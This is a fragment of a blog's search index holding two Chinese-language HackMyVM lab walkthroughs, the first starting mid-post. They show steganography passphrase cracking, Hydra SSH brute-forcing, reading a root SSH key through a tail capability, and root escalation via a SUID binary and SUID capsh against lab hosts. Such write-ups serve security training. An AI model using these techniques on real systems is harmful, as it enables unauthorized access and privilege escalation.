class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;cat-hidden.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Cat Hidden&quot;</span> <span class="attr">width</span>=<span class="string">&quot;400&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>尝试 stegsolve 和 010 Editor等后去看大佬wp，用 stegseek：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">stegseek -wl /usr/share/wordlists/rockyou.txt cat-hidden.jpg  </span><br><span class="line">StegSeek 0.6 - https://github.com/RickdeJager/StegSeek</span><br><span class="line">[i] Found passphrase: <span class="string">&quot;sexymama&quot;</span></span><br><span class="line">[i] Original filename: <span class="string">&quot;mateo.txt&quot;</span>.</span><br><span class="line">[i] Extracting to <span class="string">&quot;cat-hidden.jpg.out&quot;</span>.</span><br><span class="line"></span><br><span class="line">stegseek -wl /usr/share/wordlists/rockyou.txt cat-original.jpg</span><br><span class="line">StegSeek 0.6 - https://github.com/RickdeJager/StegSeek</span><br><span class="line">[i] Found passphrase: <span class="string">&quot;westlife&quot;</span></span><br><span class="line">[i] Original filename: <span class="string">&quot;markus.txt&quot;</span>.</span><br><span class="line">[i] Extracting to <span class="string">&quot;cat-original.jpg.out&quot;</span>.</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> cat-hidden.jpg.out </span><br><span class="line">thisismypassword</span><br><span class="line"><span class="built_in">cat</span> cat-original.jpg.out</span><br><span class="line">markuslovesbonita</span><br></pre></td></tr></table></figure><p>猜测疑似的用户与密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mateo</span><br><span class="line">markus</span><br><span class="line">bonita</span><br><span class="line">thisismypassword</span><br><span class="line">markuslovesbonita</span><br></pre></td></tr></table></figure><h2 id="三、爆破-SSH-登录"><a href="#三、爆破-SSH-登录" class="headerlink" title="三、爆破 SSH 登录"></a>三、爆破 SSH 登录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -L up.txt -p up.txt ssh://192.168.56.104:2222 -V</span><br><span class="line">[2222][ssh] host: 192.168.56.104   login: markus   password: markuslovesbonita</span><br><span class="line">[2222][ssh] host: 192.168.56.104   login: mateo   password: thisismypassword</span><br></pre></td></tr></table></figure><h2 id="四、本地信息探测"><a href="#四、本地信息探测" class="headerlink" title="四、本地信息探测"></a>四、本地信息探测</h2><p>登录后查看 note.txt：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hi bonita,</span><br><span class="line">I have saved your id_rsa here: /var/cache/apt/id_rsa</span><br><span class="line">Nobody can find it.</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /var/cache/apt/id_rsa</span><br><span class="line">-rw------- 1 root root     1823 Oct 14  2020 id_rsa</span><br></pre></td></tr></table></figure><h2 id="五、查找-Capability-权限"><a href="#五、查找-Capability-权限" class="headerlink" title="五、查找 Capability 权限"></a>五、查找 Capability 权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/getcap / -r 2&gt;/dev/null</span><br><span class="line">/usr/bin/ping = cap_net_raw+ep</span><br><span class="line">/usr/bin/tail = cap_dac_read_search+ep</span><br></pre></td></tr></table></figure><p><code>tail</code> 可以以root权限读取任意文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/tail -n +1 /var/cache/apt/id_rsa</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br><span class="line">ssh -i id_rsa bonita@192.168.56.104 -p 2222</span><br></pre></td></tr></table></figure><h2 id="六、本地提权（SUID）"><a href="#六、本地提权（SUID）" class="headerlink" title="六、本地提权（SUID）"></a>六、本地提权（SUID）</h2><p>bonita 用户目录下发现 suid 文件：<code>beroot</code></p><p>运行后提示输入 code，使用ida静态分析得知：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n5880; <span class="comment">// [rsp+1Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the code:\n &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%i&quot;</span>, &amp;n5880);</span><br><span class="line">  <span class="keyword">if</span> ( n5880 == <span class="number">5880</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nWRONG&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接输入 <code>5880</code> 即可获得 root：</p><h2 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h2><ul><li>stegseek（爆破 JPEG 隐写）</li><li>getcap查看Capability 权限命令</li></ul>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> hackmyvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackmyvm-alzheimer</title>
      <link href="/2025/07/01/hackmyvm-alzheimer/"/>
      <url>/2025/07/01/hackmyvm-alzheimer/</url>
      
        <content type="html"><![CDATA[<h2 id="一、信息收集阶段"><a href="#一、信息收集阶段" class="headerlink" title="一、信息收集阶段"></a>一、信息收集阶段</h2><p>使用 <code>nmap</code> 进行基础服务扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.56.101</span><br><span class="line">21/tcp open     ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp filtered ssh</span><br><span class="line">80/tcp filtered http</span><br></pre></td></tr></table></figure><p>仅 21 端口开放，22 与 80 被防火墙过滤。</p><h2 id="二、FTP-匿名访问"><a href="#二、FTP-匿名访问" class="headerlink" title="二、FTP 匿名访问"></a>二、FTP 匿名访问</h2><p>尝试匿名登录 FTP：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.56.101</span><br></pre></td></tr></table></figure><p>使用 <code>anonymous</code> 用户成功登录，列出文件后发现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.secretnote.txt</span><br></pre></td></tr></table></figure><p>读取该文件内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> .secretnote.txt</span><br></pre></td></tr></table></figure><p>输出内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">I need to knock this ports and </span><br><span class="line">one door will be open!</span><br><span class="line">1000</span><br><span class="line">2000</span><br><span class="line">3000</span><br></pre></td></tr></table></figure><blockquote><p>💡 判断为端口敲门（Port Knocking）机制 —— 按顺序访问指定端口后会触发服务开放。</p></blockquote><hr><h2 id="三、触发端口敲门"><a href="#三、触发端口敲门" class="headerlink" title="三、触发端口敲门"></a>三、触发端口敲门</h2><p>使用 <code>nmap</code> 模拟访问指定端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn --host-timeout 201 --max-retries 0 -p 1000,2000,3000 192.168.56.101</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line"><span class="comment">#knock 192.168.56.101 1000 2000 3000</span></span><br></pre></td></tr></table></figure><p>再次扫描开放端口，发现 SSH 与 HTTP 已开放：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.56.101</span><br></pre></td></tr></table></figure><p>扫描结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">80/tcp open  http    nginx 1.14.2</span><br></pre></td></tr></table></figure><hr><h2 id="四、Web-信息搜集"><a href="#四、Web-信息搜集" class="headerlink" title="四、Web 信息搜集"></a>四、Web 信息搜集</h2><p>访问首页：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.56.101</span><br></pre></td></tr></table></figure><p>返回内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">I dont remember where I stored my password :(</span><br><span class="line">I only remember that was into a .txt file...</span><br><span class="line">-medusa</span><br><span class="line"></span><br><span class="line">&lt;!---. --- - .... .. -. --. --&gt;</span><br></pre></td></tr></table></figure><ul><li>可疑用户名：<code>medusa</code></li><li>页面隐藏摩斯密码：<code>--- --- - .... .. -. --.</code> 解码为 “nothing”</li></ul><hr><h2 id="五、目录扫描"><a href="#五、目录扫描" class="headerlink" title="五、目录扫描"></a>五、目录扫描</h2><p>对 Web 服务进行目录爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 40</span><br></pre></td></tr></table></figure><p>发现路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/admin</span><br><span class="line">/home</span><br><span class="line">/secret</span><br></pre></td></tr></table></figure><p>但这些目录中的内容多为迷惑信息，无显著突破。</p><hr><h2 id="六、回到-FTP，文件发生变化"><a href="#六、回到-FTP，文件发生变化" class="headerlink" title="六、回到 FTP，文件发生变化"></a>六、回到 FTP，文件发生变化</h2><p>重新连接 FTP，发现 <code>.secretnote.txt</code> 内容发生了变化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">I need to knock this ports and </span><br><span class="line">one door will be open!</span><br><span class="line">1000</span><br><span class="line">2000</span><br><span class="line">3000</span><br><span class="line">Ihavebeenalwayshere!!!</span><br></pre></td></tr></table></figure><p>推测为提示我们已完成敲门，服务全部开放，下一步可登录 SSH。</p><hr><h2 id="七、SSH-登录与提权"><a href="#七、SSH-登录与提权" class="headerlink" title="七、SSH 登录与提权"></a>七、SSH 登录与提权</h2><p>使用用户名 <code>medusa</code> 和密码登录 SSH（密码推测来源于 FTP 或站点信息）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh medusa@192.168.56.101</span><br></pre></td></tr></table></figure><h3 id="7-1-sudo-权限枚举"><a href="#7-1-sudo-权限枚举" class="headerlink" title="7.1 sudo 权限枚举"></a>7.1 sudo 权限枚举</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure><p>发现可执行 <code>/bin/id</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ALL) NOPASSWD: /bin/id</span><br></pre></td></tr></table></figure><p>无明显提权突破，继续寻找 SUID 程序。</p><h3 id="7-2-查找-SUID-程序"><a href="#7-2-查找-SUID-程序" class="headerlink" title="7.2 查找 SUID 程序"></a>7.2 查找 SUID 程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>发现关键提权点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/capsh</span><br></pre></td></tr></table></figure><p>该程序支持通过 <code>--uid=0 --gid=0</code> 提权：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/capsh --gid=0 --uid=0 --</span><br></pre></td></tr></table></figure><p>获取 <code>root</code> shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>成功提权。</p><hr><h2 id="八、总结"><a href="#八、总结" class="headerlink" title="八、总结"></a>八、总结</h2><ul><li>利用了 FTP 匿名访问发现敲门信息</li><li>模拟敲门成功开放被过滤端口</li><li>利用存在的 SUID 程序 capsh 成功提权为 root</li></ul>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> hackmyvm </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
